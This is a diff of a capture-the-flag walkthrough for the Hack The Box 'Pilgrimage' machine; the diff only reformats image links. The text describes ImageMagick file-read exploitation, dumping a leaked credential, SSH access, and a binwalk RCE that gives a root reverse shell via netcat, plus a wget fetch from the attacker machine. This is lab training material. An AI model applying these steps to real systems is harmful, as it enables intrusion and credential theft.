@@ -36,9 +36,9 @@ First start the reconnaissance by running `rustscan` on the target IP address.
 
 Command: `rustscan -a 10.10.11.219 -- -A`
 
-![[Pilgrimage/assets/Untitled.png|Untitled.png]]
+![Untitled.png](Pilgrimage/assets/Untitled.png)
 
-![[Pilgrimage/assets/Untitled 1.png|Untitled 1.png]]
+![Untitled 1.png](Pilgrimage/assets/Untitled%201.png)
 
 From the output of `rustscan` , we can devise that the two open ports found:
 
@@ -52,11 +52,11 @@ Next I tried to run the nmap default scripts on the ports that we found.
 
 Command: `nmap -sC -p 22,80 10.10.11.219`
 
-![[Pilgrimage/assets/Untitled 2.png|Untitled 2.png]]
+![Untitled 2.png](Pilgrimage/assets/Untitled%202.png)
 
 From the results of the default scripts, we have found a git repository.
 
-![[Pilgrimage/assets/Untitled 3.png|Untitled 3.png]]
+![Untitled 3.png](Pilgrimage/assets/Untitled%203.png)
 
 Now we can dump this git repository using the tool `git-dumper`.
 
@@ -66,27 +66,27 @@ You can install `git-dumper` using following steps:
 - Next activate the virtual environment using the command `source ./env/bin/activate`.
 - Now install `git-dumper` using `pip3 install git-dumper`.
 
-![[Pilgrimage/assets/Untitled 4.png|Untitled 4.png]]
+![Untitled 4.png](Pilgrimage/assets/Untitled%204.png)
 
 Now its time to dump the git repository.
 
-![[Pilgrimage/assets/Untitled 5.png|Untitled 5.png]]
+![Untitled 5.png](Pilgrimage/assets/Untitled%205.png)
 
 When I tried to dump the website using the IP address, the request get’s redirected. So I visited the website on port 80.
 
-![[Pilgrimage/assets/Untitled 6.png|Untitled 6.png]]
+![Untitled 6.png](Pilgrimage/assets/Untitled%206.png)
 
 The website gets redirected to `pilgrimage.htb`. To visit the website we have add this domain to our machines `hosts` file. Open `/etc/hosts` file with root permissions with your favourite text editor and add the following: `10.10.11.219 pilgrimage.htb`and save the file.
 
-![[Pilgrimage/assets/Untitled 7.png|Untitled 7.png]]
+![Untitled 7.png](Pilgrimage/assets/Untitled%207.png)
 
 Now reload the website.
 
-![[Pilgrimage/assets/Untitled 8.png|Untitled 8.png]]
+![Untitled 8.png](Pilgrimage/assets/Untitled%208.png)
 
 You can see the website now opens. Let’s try `git-dumper` using the domain name.
 
-![[Pilgrimage/assets/Untitled 9.png|Untitled 9.png]]
+![Untitled 9.png](Pilgrimage/assets/Untitled%209.png)
 
 And it worked. After the dump is completed, I opened the entire project folder in vscode to view the code.
 
@@ -94,7 +94,7 @@ I checked the `login.php` and `register.php`, was looking out for SQL injection 
 
 I checked the `magick` tool version and found the version.
 
-![[Pilgrimage/assets/Untitled 10.png|Untitled 10.png]]
+![Untitled 10.png](Pilgrimage/assets/Untitled%2010.png)
 
 I googled out for this version and found this vulnerability: [https://www.exploit-db.com/exploits/51261](https://www.exploit-db.com/exploits/51261).
 
@@ -104,7 +104,7 @@ From the above link found the proof of concept : [https://github.com/voidz0r/CVE
 
 To exploit this vulnerability, first I cloned the proof of concept repository.
 
-![[Pilgrimage/assets/Untitled 11.png|Untitled 11.png]]
+![Untitled 11.png](Pilgrimage/assets/Untitled%2011.png)
 
 Next I installed `rust` to run the downloaded tool using the command: `curl https://sh.rustup.rs -sSf | sh`. After installing `rust` run the following command to use cargo: `source ~/.cargo/env`.
 
@@ -112,61 +112,61 @@ Next I installed `rust` to run the downloaded tool using the command: `curl http
 
 Now run the tool and exploit the LFI vulnerability, first try to read the `/etc/passwd` file.
 
-![[Pilgrimage/assets/Untitled 12.png|Untitled 12.png]]
+![Untitled 12.png](Pilgrimage/assets/Untitled%2012.png)
 
 Next upload the create `image.png` to the website to shrink it. After shrinking copy the resized image URL.
 
-![[Pilgrimage/assets/Untitled 13.png|Untitled 13.png]]
+![Untitled 13.png](Pilgrimage/assets/Untitled%2013.png)
 
 Next download the resized image.
 
-![[Pilgrimage/assets/Untitled 14.png|Untitled 14.png]]
+![Untitled 14.png](Pilgrimage/assets/Untitled%2014.png)
 
 Now view the raw content of the downloaded image using the `magick` tools `identify` utility. Use the same `magick` tool, that we got from the git dump.
 
-![[Pilgrimage/assets/Untitled 15.png|Untitled 15.png]]
+![Untitled 15.png](Pilgrimage/assets/Untitled%2015.png)
 
 Scroll down to get the raw hex version of the embedded details of the `/etc/passwd` file from the target machine.
 
-![[Pilgrimage/assets/Untitled 16.png|Untitled 16.png]]
+![Untitled 16.png](Pilgrimage/assets/Untitled%2016.png)
 
 Copy the above block of hex code and put it in [https://gchq.github.io/CyberChef/](https://gchq.github.io/CyberChef/), and use the ingredient named `From Hex`.
 
-![[Pilgrimage/assets/Untitled 17.png|Untitled 17.png]]
+![Untitled 17.png](Pilgrimage/assets/Untitled%2017.png)
 
 From the decode text, we have found a user named `emily` on the target machine.
 
 If you check the `register.php` page that we got from the git dump, you can see that the database connection is made by using a db file `/var/db/pilgrimage`.
 
-![[Pilgrimage/assets/Untitled 18.png|Untitled 18.png]]
+![Untitled 18.png](Pilgrimage/assets/Untitled%2018.png)
 
 Now, this time instead of reading `/etc/passwd` file, we can try to read the `/var/db/pilgrimage` file. Now create the payload image.
 
-![[Pilgrimage/assets/Untitled 19.png|Untitled 19.png]]
+![Untitled 19.png](Pilgrimage/assets/Untitled%2019.png)
 
 Next upload the payload image and download the resized image.
 
-![[Pilgrimage/assets/Untitled 20.png|Untitled 20.png]]
+![Untitled 20.png](Pilgrimage/assets/Untitled%2020.png)
 
 Now view the raw content of the image. I piped the output to vscode, since the output has more lines which I can’t able to copy from the terminal.
 
-![[Pilgrimage/assets/Untitled 21.png|Untitled 21.png]]
+![Untitled 21.png](Pilgrimage/assets/Untitled%2021.png)
 
 Now copy the raw content and put it in cyber chef.
 
 Since the output is sqlite db file, I downloaded the output using the download option, and opened it in a sqlite db viewer.
 
-![[Pilgrimage/assets/2023-09-05_19-51.png]]
+![2023-09-05_19-51](Pilgrimage/assets/2023-09-05_19-51.png)
 
 After decoding and downloading the file, go to [https://sqliteviewer.app/](https://sqliteviewer.app/) and upload the downloaded file to view the contents of the db.
 
-![[Pilgrimage/assets/Untitled 22.png|Untitled 22.png]]
+![Untitled 22.png](Pilgrimage/assets/Untitled%2022.png)
 
 We have found a credential, `emily:abigchonkyboi123`.
 
 Now we have got a password for `emily`. let’s try to ssh to the target machine using the above credentials.
 
-![[Pilgrimage/assets/Untitled 23.png|Untitled 23.png]]
+![Untitled 23.png](Pilgrimage/assets/Untitled%2023.png)
 
 We have successfully found the user flag. Next we have to escalate our privileges to read the root flag.
 
@@ -174,51 +174,51 @@ We have successfully found the user flag. Next we have to escalate our privilege
 
 I started looking out for some common Privilege Escalation vectors, such as files with SUID bit, commands that we can execute as sudo and also checked for NFS shares.
 
-![[Pilgrimage/assets/Untitled 24.png|Untitled 24.png]]
+![Untitled 24.png](Pilgrimage/assets/Untitled%2024.png)
 
 And also looked out for cron jobs, but found nothing interesting.
 
-![[Pilgrimage/assets/Untitled 25.png|Untitled 25.png]]
+![Untitled 25.png](Pilgrimage/assets/Untitled%2025.png)
 
 Next, I used `PsPy` [ [https://github.com/DominicBreuker/pspy/releases/](https://github.com/DominicBreuker/pspy/releases/) ] tool to check out for active processes.
 
 Since, out target machine doesn’t have a internet connection, we have to move it from our local machine to the target machine. For that first we have to download pspy on our local machine.
 
-![[Pilgrimage/assets/Untitled 26.png|Untitled 26.png]]
+![Untitled 26.png](Pilgrimage/assets/Untitled%2026.png)
 
 After downloading pspy, its time to move it to the target machine.
 
 Start a simple python http server on our local machine in the same directory where the pspy tool is located.
 
-![[Pilgrimage/assets/Untitled 27.png|Untitled 27.png]]
+![Untitled 27.png](Pilgrimage/assets/Untitled%2027.png)
 
 Now in the target machine, download the tool using `wget`.
 
 Command: `wget http://<LocalMachine_tun0_IP>/pspy64`
 
-![[Pilgrimage/assets/Untitled 28.png|Untitled 28.png]]
+![Untitled 28.png](Pilgrimage/assets/Untitled%2028.png)
 
 After downloading the tool, give it executable permission.
 
-![[Pilgrimage/assets/Untitled 29.png|Untitled 29.png]]
+![Untitled 29.png](Pilgrimage/assets/Untitled%2029.png)
 
 Now run the tool.
 
-![[Pilgrimage/assets/Untitled 30.png|Untitled 30.png]]
+![Untitled 30.png](Pilgrimage/assets/Untitled%2030.png)
 
-![[Pilgrimage/assets/Untitled 31.png|Untitled 31.png]]
+![Untitled 31.png](Pilgrimage/assets/Untitled%2031.png)
 
 From the output of pspy, we can see a shell script named `malwarescan.sh`, which is located at `/usr/sbin/malwarescan.sh`, which has a UID of 0, which means it is executed with root permission.
 
 I tried to view the contents of the file.
 
-![[Pilgrimage/assets/Untitled 32.png|Untitled 32.png]]
+![Untitled 32.png](Pilgrimage/assets/Untitled%2032.png)
 
 The contains a simple bash script, which actively checks the `/var/www/pilgrimage` directory for new files, looking out for `Executable script` and `Microsoft executable`, and removes them if it finds. It uses the `binwalk` tool, located at `/usr/local/bin/binwalk`, to perform the check.
 
 I checked the version of `binwalk` and googled about that particular version.
 
-![[Pilgrimage/assets/Untitled 33.png|Untitled 33.png]]
+![Untitled 33.png](Pilgrimage/assets/Untitled%2033.png)
 
 I found this: [https://www.exploit-db.com/exploits/51249](https://www.exploit-db.com/exploits/51249). From this we came to know that the binwalk tool is vulnerable to Remote Code Execution.
 
@@ -228,35 +228,35 @@ To exploit this vulnerability, first I downloaded the exploit in my local machin
 
 Command: `wget https://www.exploit-db.com/download/51249`.
 
-![[Pilgrimage/assets/Untitled 34.png|Untitled 34.png]]
+![Untitled 34.png](Pilgrimage/assets/Untitled%2034.png)
 
 After downloading, run the exploit.
 
 If you check the source code of the exploit, we can see that it expects three arguements.
 
-![[Pilgrimage/assets/Untitled 35.png|Untitled 35.png]]
+![Untitled 35.png](Pilgrimage/assets/Untitled%2035.png)
 
 It first expects a image file with `png` extension [ Any image of type PNG of your choice ], next it expects the IP address and PORT for the netcat listener, that we will be setting up in our local machine, to get a reverse shell back.
 
 Now with all the requirements run the exploit.
 
-![[Pilgrimage/assets/Untitled 36.png|Untitled 36.png]]
+![Untitled 36.png](Pilgrimage/assets/Untitled%2036.png)
 
 Now we have got the payload ready. Its time to move this payload to the target machine. Start the http server and download the payload to the target machine.
 
-![[Pilgrimage/assets/Untitled 37.png|Untitled 37.png]]
+![Untitled 37.png](Pilgrimage/assets/Untitled%2037.png)
 
 Now start a netcat listener on port 8080 on your local machine.
 
-![[Pilgrimage/assets/Untitled 38.png|Untitled 38.png]]
+![Untitled 38.png](Pilgrimage/assets/Untitled%2038.png)
 
 After downloading the payload to the target machine, move the payload to `/var/www/pilgrimage.htb/shrunk/` directory, since the `malwarescan.sh` script actively checks that location for changes.
 
-![[Pilgrimage/assets/Untitled 39.png|Untitled 39.png]]
+![Untitled 39.png](Pilgrimage/assets/Untitled%2039.png)
 
 After moving the file, check your netcat listener.
 
-![[Pilgrimage/assets/Untitled 40.png|Untitled 40.png]]
+![Untitled 40.png](Pilgrimage/assets/Untitled%2040.png)
 
 We have successfully got the connection back and escalated our privileges as root, also got the root flag successfully.
 
